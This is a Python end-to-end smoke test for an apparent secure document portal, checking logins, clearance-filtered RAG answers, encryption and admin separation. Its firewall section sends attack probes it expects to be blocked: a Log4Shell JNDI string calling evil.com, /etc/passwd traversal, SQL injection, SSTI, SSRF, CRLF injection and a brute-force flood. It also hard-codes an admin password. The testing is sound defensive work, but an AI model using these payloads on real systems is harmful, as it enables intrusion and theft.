"""
DocuVault Enterprise — end-to-end smoke test.

Run against a live server:
    python scripts/smoke.py [base_url]

Verifies: shell boot, login, RBAC document visibility, RAG answers with and
without clearance, upload -> index -> answer flow, encrypted-at-rest bytes,
download, delete, admin separation, audit entries, health probe.
"""
import json
import re
import sys
import pathlib

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
PASS, FAIL = 0, 0


def check(name, cond, extra=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  [PASS] {name}")
    else:
        FAIL += 1
        print(f"  [FAIL] {name} {extra}")


def boot_and_login(username, password):
    s = requests.Session()
    r = s.get(BASE + "/", timeout=30)
    m = re.search(r"window\.__BOOT__ = (\{.*?\});</script>", r.text, re.S)
    assert m, "shell did not render boot state"
    boot = json.loads(m.group(1).replace("<\\/", "</"))
    r = s.post(BASE + "/api/login", headers={
        "X-Session-ID": boot["session_id"], "X-CSRF-Token": boot["csrf_token"],
    }, json={"username": username, "password": password, "csrf_token": boot["csrf_token"]}, timeout=60)
    assert r.status_code == 200, f"login failed for {username}: {r.status_code} {r.text}"
    d = r.json()
    hdrs = {"X-Session-ID": d["session_id"], "X-CSRF-Token": d["csrf_token"]}
    return s, hdrs, d["user"]


def main():
    print(f"Smoke-testing {BASE}\n")

    r = requests.get(BASE + "/api/health", timeout=15)
    check("health probe", r.status_code == 200 and r.json().get("status") == "ok")

    # ---------- bootstrap provisioning ----------
    # The vault ships empty (no demo users, no demo documents), so the smoke
    # test provisions its own accounts and fixtures through the admin API —
    # exactly how a real deployment would be set up.
    import uuid as _uuid0

    s_adm, h_adm, adm = boot_and_login("admin", "Vault#Root2026")
    check("admin bootstrap login", adm["role"] == "ADMIN")

    qa_emp_name = "qa.emp." + _uuid0.uuid4().hex[:6]
    qa_mgr_name = "qa.mgr." + _uuid0.uuid4().hex[:6]
    QA_EMP_PW, QA_MGR_PW = "Bluebird#2026", "CopperSun#2026"

    r = s_adm.post(BASE + "/api/admin/users", headers=h_adm, timeout=30, json={
        "username": qa_emp_name, "full_name": "QA Employee", "email": qa_emp_name + "@qa.example",
        "role": "EMPLOYEE", "password": QA_EMP_PW})
    check("admin creates employee account", r.status_code == 200, f"-> {r.status_code} {r.text[:120]}")
    r = s_adm.post(BASE + "/api/admin/users", headers=h_adm, timeout=30, json={
        "username": qa_mgr_name, "full_name": "QA Manager", "email": qa_mgr_name + "@qa.example",
        "role": "MANAGER", "password": QA_MGR_PW})
    check("admin creates manager account", r.status_code == 200, f"-> {r.status_code} {r.text[:120]}")

    FIXTURES = [
        ("QA_Company_Announcement.txt", 1,
         "Meridian Systems - Company Announcement.\n\n"
         "The annual company picnic will be held on Saturday, 14 March 2026 at Lakeview Park "
         "from 11 AM to 4 PM. Families are welcome and lunch is provided by the company. "
         "Please register with the HR desk by 1 March. Parking is available at the north gate "
         "and a shuttle bus will run from the main office every thirty minutes.\n\n"
         "The fitness room on the second floor reopens on Monday after renovation. The new "
         "opening hours are 6 AM to 9 PM on weekdays and 8 AM to 6 PM on weekends."),
        ("QA_Employee_Handbook.txt", 2,
         "QA Employee Handbook - leave policy.\n\n"
         "Full-time employees receive 20 paid vacation days per year, in addition to public "
         "holidays. Vacation days must be approved by the reporting manager in the HR portal "
         "at least two weeks in advance. Unused paid vacation days may be carried over into "
         "the next year, up to a maximum of five days. Sick leave is separate and does not "
         "reduce paid vacation days. Probationary employees accrue paid vacation days from "
         "their first month. Questions about paid vacation days should be directed to "
         "People Operations."),
        ("QA_Salary_Bands.txt", 3,
         "QA Salary Bands - engineering department, fiscal year 2026. Confidential.\n\n"
         "Associate Software Engineer: 62,000 USD to 78,000 USD. Software Engineer: 80,000 USD "
         "to 98,000 USD. Senior Software Engineer: 105,000 USD to 132,000 USD. Principal "
         "Engineer: 140,000 USD to 175,000 USD. Bands are reviewed annually by the "
         "compensation committee. Do not distribute outside management."),
        ("QA_Project_Falcon_Brief.txt", 4,
         "QA Project Falcon Brief. Restricted - clearance level 4 only.\n\n"
         "Project Falcon is the codename for the proposed acquisition of Helio Dynamics by "
         "Meridian Systems. The acquisition committee has evaluated Helio Dynamics at an "
         "indicative value of 40 million USD. Integration planning covers the Helio Dynamics "
         "sensor portfolio and the combined go-to-market strategy for the merged sales "
         "organisation."),
    ]
    upload_ok = True
    for fname, fcls, ftext in FIXTURES:
        r = s_adm.post(BASE + "/api/documents/upload", headers=h_adm, timeout=120,
                       files={"file": (fname, ftext.encode("utf-8"), "text/plain")},
                       data={"classification": str(fcls)})
        if r.status_code != 200 or r.json().get("chunks", 0) < 1:
            upload_ok = False
            print(f"    fixture {fname}: HTTP {r.status_code} {r.text[:120]}")
    check("admin uploads 4 classified fixtures (Public..Restricted)", upload_ok)

    # ---------- employee ----------
    s_emp, h_emp, emp = boot_and_login(qa_emp_name, QA_EMP_PW)
    check("employee login + session rotation", emp["role"] == "EMPLOYEE" and emp["clearance"] == 2)

    r = s_emp.get(BASE + "/api/me", headers=h_emp, timeout=30)
    check("GET /api/me", r.status_code == 200 and r.json()["documents_visible"] < r.json()["documents_total"],
          f"-> {r.text[:120]}")

    r = s_emp.get(BASE + "/api/documents", headers=h_emp, timeout=30)
    docs = r.json()["documents"]
    names = [d["name"] for d in docs]
    check("employee sees only clearance <= Internal", r.status_code == 200
          and all(d["classification"] <= 2 for d in docs)
          and "QA_Salary_Bands.txt" not in names and "QA_Project_Falcon_Brief.txt" not in names,
          f"-> {names}")

    r = s_emp.post(BASE + "/api/ask", headers=h_emp,
                   json={"question": "How many paid vacation days do employees get?"}, timeout=120)
    ans = r.json().get("answer", "")
    check("RAG answers leave-policy question with citation",
          r.status_code == 200 and "20" in ans and r.json()["sources"], f"-> {ans[:160]}")

    r = s_emp.post(BASE + "/api/ask", headers=h_emp,
                   json={"question": "What is the salary band for Senior Software Engineer?"}, timeout=120)
    ans = r.json().get("answer", "")
    check("RAG refuses confidential question (clearance-filtered retrieval)",
          r.status_code == 200 and "could not find" in ans.lower(), f"-> {ans[:160]}")

    # CSRF must be enforced (valid session, missing token)
    r = s_emp.post(BASE + "/api/ask", headers={"X-Session-ID": h_emp["X-Session-ID"]},
                   json={"question": "hello"}, timeout=30)
    check("missing CSRF token rejected", r.status_code == 403, f"-> {r.status_code}")

    # Upload -> index -> ask
    content = (b"Project Atlas Kickoff Notes. The Project Atlas budget approved by the finance "
               b"committee is 400,000 USD for fiscal year 2026. Owner: QA tooling team.")
    r = s_emp.post(BASE + "/api/documents/upload", headers=h_emp,
                   files={"file": ("project_atlas_notes.txt", content, "text/plain")},
                   data={"classification": "2"}, timeout=120)
    check("employee upload (Internal) accepted + indexed",
          r.status_code == 200 and r.json()["chunks"] >= 1, f"-> {r.status_code} {r.text[:160]}")
    doc_id = r.json()["id"]

    r = s_emp.post(BASE + "/api/ask", headers=h_emp,
                   json={"question": "What is the Project Atlas budget?"}, timeout=120)
    ans = r.json().get("answer", "")
    check("RAG answers question about freshly uploaded document",
          r.status_code == 200 and "400,000" in ans, f"-> {ans[:160]}")

    # Encrypted at rest: the stored blob must not contain plaintext
    blob = None
    for p in pathlib.Path(__file__).resolve().parent.parent.glob("data/encrypted/*.bin"):
        blob = p.read_bytes()[:200]
    check("document ciphertext on disk contains no plaintext",
          blob is not None and b"Project Atlas" not in blob)

    # Employee blocked from admin API
    r = s_emp.get(BASE + "/api/admin/overview", headers=h_emp, timeout=30)
    check("admin API blocked for employee (403)", r.status_code == 403)

    # Employee cannot delete someone else's document
    conf = [d for d in docs if d["name"] == "QA_Employee_Handbook.txt"]
    if conf:
        r = s_emp.delete(BASE + f"/api/documents/{conf[0]['id']}", headers=h_emp, timeout=30)
        check("employee cannot delete admin-owned document (403)", r.status_code == 403)

    # Download own doc, then delete it
    r = s_emp.get(BASE + f"/api/documents/{doc_id}/file", headers=h_emp, timeout=30)
    check("download returns decrypted original", r.status_code == 200 and r.content == content)
    r = s_emp.delete(BASE + f"/api/documents/{doc_id}", headers=h_emp, timeout=30)
    check("owner delete succeeds", r.status_code == 200)

    # Bad login
    s_bad, h_bad, _ = boot_and_login.__wrapped__ if False else (requests.Session(), None, None)
    rb = s_bad.get(BASE + "/", timeout=30)
    mb = re.search(r"window\.__BOOT__ = (\{.*?\});</script>", rb.text, re.S)
    boot_bad = json.loads(mb.group(1).replace("<\\/", "</"))
    r = s_bad.post(BASE + "/api/login", headers={
        "X-Session-ID": boot_bad["session_id"]}, json={
        "username": qa_emp_name, "password": "WrongPassword#1", "csrf_token": boot_bad["csrf_token"]}, timeout=30)
    check("wrong password returns generic 401", r.status_code == 401
          and r.json()["detail"] == "Invalid username or password.")

    # ---------- manager ----------
    s_mgr, h_mgr, mgr = boot_and_login(qa_mgr_name, QA_MGR_PW)
    r = s_mgr.get(BASE + "/api/documents", headers=h_mgr, timeout=30)
    names = [d["name"] for d in r.json()["documents"]]
    check("manager sees Confidential but not Restricted",
          "QA_Salary_Bands.txt" in names and "QA_Project_Falcon_Brief.txt" not in names, f"-> {names}")
    r = s_mgr.post(BASE + "/api/ask", headers=h_mgr,
                   json={"question": "What is the salary band for Senior Software Engineer?"}, timeout=120)
    ans = r.json().get("answer", "")
    check("manager gets salary band answer", r.status_code == 200 and "105,000" in ans, f"-> {ans[:160]}")

    # ---------- admin (session reused from bootstrap) ----------
    r = s_adm.get(BASE + "/api/documents", headers=h_adm, timeout=30)
    names = [d["name"] for d in r.json()["documents"]]
    check("admin sees all documents", "QA_Project_Falcon_Brief.txt" in names)
    r = s_adm.post(BASE + "/api/ask", headers=h_adm,
                   json={"question": "Which company is Meridian acquiring in Project Falcon?"}, timeout=120)
    ans = r.json().get("answer", "")
    check("admin RAG reads Restricted document", r.status_code == 200 and "Helio" in ans, f"-> {ans[:160]}")
    r = s_adm.get(BASE + "/api/admin/overview", headers=h_adm, timeout=30)
    ov = r.json()
    check("admin overview: users, audit, system", r.status_code == 200
          and len(ov["users"]) >= 3 and len(ov["audit"]) >= 5 and "encryption" in ov["system"])

    # ---------- user administration & permissions ----------
    import uuid as _uuid2
    uname = "smoke." + _uuid2.uuid4().hex[:6]
    r = s_adm.post(BASE + "/api/admin/users", headers=h_adm, timeout=30, json={
        "username": uname, "full_name": "Smoke Perm User", "email": "smoke@x.example",
        "role": "EMPLOYEE", "clearance": 1, "password": "Perms#Test77",
        "permissions": {"upload": False, "ask": False, "download": True, "delete_own": False}})
    check("admin creates user with granular permissions", r.status_code == 200
          and r.json()["perms"]["upload"] is False and r.json()["perms"]["ask"] is False,
          f"-> {r.status_code} {r.text[:120]}")

    r = s_adm.post(BASE + "/api/admin/users", headers=h_adm, timeout=30, json={
        "username": "weak.pw." + _uuid2.uuid4().hex[:4], "full_name": "Weak", "role": "EMPLOYEE",
        "password": "password123"})
    check("weak password rejected at user creation (400)", r.status_code == 400, f"-> {r.status_code}")

    s_p, h_p, u_p = boot_and_login(uname, "Perms#Test77")
    r = s_p.post(BASE + "/api/ask", headers=h_p, json={"question": "test"}, timeout=60)
    check("user without chat permission blocked from /api/ask (403)", r.status_code == 403,
          f"-> {r.status_code}")
    r = s_p.post(BASE + "/api/documents/upload", headers=h_p, timeout=60,
                 files={"file": ("x.txt", b"hello world content here", "text/plain")},
                 data={"classification": "1"})
    check("user without upload permission blocked from upload (403)", r.status_code == 403,
          f"-> {r.status_code}")
    r = s_p.get(BASE + "/api/documents", headers=h_p, timeout=30)
    docs_p = r.json()["documents"]
    check("clearance-1 user sees only Public documents", r.status_code == 200
          and len(docs_p) >= 1 and all(d["classification"] == 1 for d in docs_p),
          f"-> {[(d['name'], d['classification']) for d in docs_p][:4]}")

    r = s_adm.patch(BASE + f"/api/admin/users/{u_p['id']}", headers=h_adm, timeout=30,
                    json={"permissions": {"upload": True, "ask": True, "download": True, "delete_own": True}})
    check("admin grants permissions via PATCH", r.status_code == 200 and r.json()["perms"]["ask"] is True,
          f"-> {r.status_code}")
    r = s_p.post(BASE + "/api/ask", headers=h_p, json={"question": "test"}, timeout=120)
    check("granted permission takes effect immediately", r.status_code == 200, f"-> {r.status_code}")

    r = s_adm.patch(BASE + f"/api/admin/users/{u_p['id']}", headers=h_adm, timeout=30,
                    json={"is_active": False})
    check("admin disables account", r.status_code == 200 and r.json()["active"] is False)
    r = s_p.get(BASE + "/api/documents", headers=h_p, timeout=30)
    check("disabled account cannot use the API (401)", r.status_code == 401, f"-> {r.status_code}")

    r = s_emp.patch(BASE + f"/api/admin/users/{u_p['id']}", headers=h_emp, timeout=30,
                    json={"is_active": True})
    check("non-admin cannot manage users (403)", r.status_code == 403, f"-> {r.status_code}")

    # ---------- Burp Suite technique protections ----------
    # (Repeater) mass-assignment / parameter tampering
    r = s_emp.post(BASE + "/api/ask", headers=h_emp, timeout=30,
                   json={"question": "hi", "is_admin": True, "clearance": 4})
    check("mass-assignment fields rejected (400)", r.status_code == 400, f"-> {r.status_code}")
    r = s_emp.post(BASE + "/api/login", headers={"X-Session-ID": "x"}, timeout=30,
                   json={"username": qa_emp_name, "password": "x", "role": "ADMIN"})
    check("role injection in login body rejected (400)", r.status_code == 400, f"-> {r.status_code}")

    # (Repeater) cross-origin write with a forged Origin header
    r = s_emp.post(BASE + "/api/ask", headers={**h_emp, "Origin": "http://evil.example"},
                   json={"question": "hi"}, timeout=30)
    check("forged Origin rejected (403)", r.status_code == 403, f"-> {r.status_code}")

    # (Repeater) stolen-session replay from a different client signature
    r = requests.post(BASE + "/api/ask", timeout=30,
                      headers={"X-Session-ID": h_emp["X-Session-ID"],
                               "X-CSRF-Token": h_emp["X-CSRF-Token"],
                               "User-Agent": "SmokeReplayClient/2.0"},
                      json={"question": "hi"})
    check("session replay with mismatched client rejected (401)", r.status_code == 401,
          f"-> {r.status_code}")

    # (Intruder) XFF rotation must not evade the auto-ban: 8 traversal probes
    # each with a DIFFERENT spoofed X-Forwarded-For must still trip the ban.
    ban_hit = False
    for i in range(9):
        rr = requests.get(BASE + "/%2e%2e/%2e%2e/etc/passwd", timeout=30,
                          headers={"X-Forwarded-For": f"10.9.0.{i + 1}"})
        if rr.status_code == 403 and "temporarily blocked" in rr.text:
            ban_hit = True
            break
    check("XFF rotation cannot evade the auto-ban", ban_hit, f"-> probes sent: {i + 1}")
    # release the ban (admin escape hatch works while banned)
    r = s_adm.post(BASE + "/api/admin/firewall/unban", headers=h_adm, timeout=30,
                   json={"ip": "127.0.0.1"})
    check("admin can clear false-positive bans while banned", r.status_code == 200,
          f"-> {r.status_code}")
    r = requests.get(BASE + "/api/health", timeout=30)
    check("ban release takes effect immediately", r.status_code == 200, f"-> {r.status_code}")

    # (Scanner) honeypot endpoint returns a quiet 404 but records the hit
    r = requests.get(BASE + "/api/debug/users", timeout=30)
    check("honeypot probe trapped (404 + logged)", r.status_code == 404)
    ev = s_adm.get(BASE + "/api/admin/overview", headers=h_adm, timeout=30).json()["security"]["recent_events"]
    check("honeypot hit visible in firewall events",
          any("Honeypot" in e["rule"] for e in ev[:15]))

    # (Scanner) CRLF injection in path
    r = requests.get(BASE + "/api/health%0d%0aX-Injected:%20yes", timeout=30)
    check("CRLF injection in path blocked (403)", r.status_code == 403, f"-> {r.status_code}")

    # (Tailored) Log4Shell / SSTI / metadata probes
    r = requests.get(BASE + "/api/health?x=${jndi:ldap://evil.com/a}", timeout=30)
    check("Log4Shell probe blocked (403)", r.status_code == 403, f"-> {r.status_code}")
    r = requests.get(BASE + "/api/health?tpl={{7*7}}", timeout=30)
    check("SSTI probe blocked (403)", r.status_code == 403, f"-> {r.status_code}")
    r = requests.get(BASE + "/api/health?ip=169.254.169.254", timeout=30)
    check("cloud-metadata SSRF probe blocked (403)", r.status_code == 403, f"-> {r.status_code}")

    # (Repeater) method override header never honoured
    r = s_emp.post(BASE + "/api/ask", headers={**h_emp, "X-HTTP-Method-Override": "DELETE"},
                   json={"question": "hi"}, timeout=30)
    check("X-HTTP-Method-Override blocked (403)", r.status_code == 403, f"-> {r.status_code}")

    # ---------- firewall / WAF / rate limiting ----------
    import uuid as _uuid

    r = requests.post(BASE + "/api/login", timeout=30, json={
        "username": "' OR 1=1 --", "password": "x", "csrf_token": "x"})
    check("SQLi in login blocked by WAF (403)", r.status_code == 403, f"-> {r.status_code} {r.text[:80]}")

    r = requests.get(BASE + "/%2e%2e/%2e%2e/etc/passwd", timeout=30)
    check("path traversal blocked by WAF (403)", r.status_code == 403, f"-> {r.status_code}")

    r = requests.get(BASE + "/wp-admin/setup.php", timeout=30,
                     headers={"User-Agent": "sqlmap/1.8"})
    check("scanner path+UA blocked by WAF (403)", r.status_code == 403, f"-> {r.status_code}")

    r = requests.post(BASE + "/api/ask", timeout=30,
                      headers={"X-Session-ID": h_emp["X-Session-ID"]},
                      json={"question": "x UNION SELECT username FROM users --"})
    check("SQLi in ask body blocked by WAF (403)", r.status_code == 403, f"-> {r.status_code}")

    s_adm.post(BASE + "/api/admin/firewall/unban", headers=h_adm, timeout=30,
               json={"ip": "127.0.0.1"})
    flood = [requests.post(BASE + "/api/login", timeout=30, json={
        "username": f"probe{_uuid.uuid4().hex[:8]}", "password": "Nope#123", "csrf_token": "x"})
        for _ in range(14)]
    check("login brute-force rate-limited (429s then escalation ban)",
          any(x.status_code == 429 for x in flood) and flood[-1].status_code in (429, 403),
          f"-> {[x.status_code for x in flood]}")
    # release escalation ban and confirm recovery
    s_adm.post(BASE + "/api/admin/firewall/unban", headers=h_adm, timeout=30,
               json={"ip": "127.0.0.1"})
    r = requests.get(BASE + "/api/health", timeout=30,
                     headers={"User-Agent": "Mozilla/5.0 smoke"})
    check("server healthy after attack probes (no lingering ban)", r.status_code == 200,
          f"-> {r.status_code}")

    r = s_adm.get(BASE + "/api/admin/overview", headers=h_adm, timeout=30)
    sec = r.json().get("security", {})
    check("admin security panel: WAF stats + events", r.status_code == 200
          and sec.get("stats", {}).get("waf_blocked", 0) >= 3 and len(sec.get("recent_events", [])) >= 3)

    # ---------- shell sanity / regression guards ----------
    html = requests.get(BASE + "/", timeout=15).text
    check("shell renders title", "DocuVault" in html and "Secure Document Search Portal" in html)
    head = html.split("<body")[0]
    check("shell loads no external scripts/stylesheets",
          'src="http' not in head and 'href="http' not in head
          and "src='http" not in head and "href='http" not in head)
    # Blank-page regression guard: Jinja autoescape must NOT mangle the inlined
    # assets (=> became =&gt; and turned every arrow function into a SyntaxError).
    check("inline JS not HTML-escaped (arrow functions intact)",
          "=&gt;" not in html and "renderLogin" in html)
    style_block = html.split("<style>")[1].split("</style>")[0]
    check("inline CSS not HTML-escaped (raw quotes intact)",
          "&#34;" not in style_block and 'font-family: "Segoe UI"' in style_block)
    check("login form present in shell", 'id="login-form"' in html)

    print(f"\nResult: {PASS} passed, {FAIL} failed")
    sys.exit(1 if FAIL else 0)


if __name__ == "__main__":
    main()
